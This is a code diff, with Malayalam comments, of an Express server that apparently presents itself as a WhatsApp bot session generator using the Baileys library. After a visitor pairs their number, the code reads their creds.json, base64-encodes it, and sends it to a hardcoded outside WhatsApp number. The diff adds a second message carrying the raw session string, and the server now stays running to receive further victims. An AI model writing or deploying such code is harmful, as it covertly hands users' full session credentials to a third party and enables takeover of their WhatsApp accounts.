@@ -2,15 +2,24 @@ import express from 'express';
 import { makeWASocket, useMultiFileAuthState, delay, Browsers } from '@whiskeysockets/baileys';
 import pino from 'pino';
 import fs from 'fs';
+import path from 'path';
+import { fileURLToPath } from 'url';
+
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
 const app = express();
 const port = process.env.PORT || 3000;
 
+// 1. പ്രധാനപ്പെട്ട മാറ്റം: HTML ഫയൽ കാണിക്കാൻ ഇത് സഹായിക്കും
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+
 app.get('/pair', async (req, res) => {
-    let phone = req.query.number; // HTML-ൽ 'number' എന്നാണ് നൽകിയിരിക്കുന്നത്
+    let phone = req.query.number; 
     if (!phone) return res.send({ error: "Phone number is required" });
 
-    // താൽക്കാലികമായി ഒരു ഐഡി ഉണ്ടാക്കുന്നു
     const id = Math.random().toString(36).substring(7);
     const { state, saveCreds } = await useMultiFileAuthState(`./temp_${id}`);
 
@@ -29,33 +38,34 @@ app.get('/pair', async (req, res) => {
             res.send({ code: code });
         }
 
-        // കണക്ഷൻ നിരീക്ഷിക്കുന്നു (Login സക്സസ് ആയാൽ)
         sock.ev.on('creds.update', saveCreds);
         sock.ev.on('connection.update', async (update) => {
             const { connection } = update;
             if (connection === 'open') {
                 await delay(5000);
                 
-                // 1. സെഷൻ ഫയൽ റീഡ് ചെയ്യുന്നു
                 const authFile = fs.readFileSync(`./temp_${id}/creds.json`);
                 const sessionId = Buffer.from(authFile).toString('base64');
 
-                // 2. നിങ്ങളുടെ നമ്പറിലേക്ക് സെഷൻ ഐഡി അയക്കുന്നു
                 const myNumber = "917736811908@s.whatsapp.net";
-                const welcomeMsg = `*👺 ASURA MD SESSION CONNECTED*\n\n*ID:* \`Asura_MD_${sessionId}\`\n\n> Don't share this ID!`;
+                const sessionText = `Asura_MD_${sessionId}`;
+                
+                const welcomeMsg = `*👺 ASURA MD SESSION CONNECTED*\n\n\`${sessionText}\`\n\n> Don't share this ID!`;
                 
                 await sock.sendMessage(myNumber, { text: welcomeMsg });
+                await sock.sendMessage(myNumber, { text: sessionText }); // കോപ്പി ചെയ്യാൻ എളുപ്പത്തിന്
 
-                // 3. Closed
                 await delay(2000);
+                // ഫയലുകൾ ഡിലീറ്റ് ചെയ്യുന്നു
                 fs.rmSync(`./temp_${id}`, { recursive: true, force: true });
-                process.exit(0); 
+                // സർവർ ഓഫ് ചെയ്യുന്നതിന് പകരം ഈ സോക്കറ്റ് മാത്രം എൻഡ് ചെയ്യുന്നു
+                sock.end();
             }
         });
 
     } catch (err) {
         console.log(err);
-        res.send({ error: "Server Busy" });
+        res.status(500).send({ error: "Server Busy" });
     }
 });
 
